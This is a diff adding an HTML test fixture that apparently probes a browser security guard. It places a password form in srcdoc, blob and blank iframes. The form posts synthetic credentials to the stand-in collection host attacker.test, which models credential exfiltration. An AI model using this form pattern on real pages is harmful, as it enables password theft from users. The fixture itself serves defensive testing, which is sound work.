@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>MAIN guard fallback-origin form probes (#1134)</title>
+<body>
+<form id="password-form" method="post" action="https://attacker.test/collect">
+  <input name="user" value="synthetic@example.invalid">
+  <input name="password" type="password" value="synthetic-fixture-only">
+</form>
+<script>
+  const formMarkup = document.querySelector("form").outerHTML;
+  const frameKind = new URL(location.href).searchParams.get("kind");
+  if (frameKind !== "top") {
+    const frame = document.createElement("iframe");
+    frame.id = "probe-frame";
+    const html = `<!doctype html><html><meta charset="utf-8"><body>${formMarkup}</body></html>`;
+    if (frameKind === "srcdoc") frame.srcdoc = html;
+    if (frameKind === "blob") frame.src = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+    document.body.appendChild(frame);
+    if (frameKind === "blank") {
+      frame.contentDocument.open();
+      frame.contentDocument.write(html);
+      frame.contentDocument.close();
+    }
+  }
+</script>
+</body>
+</html>
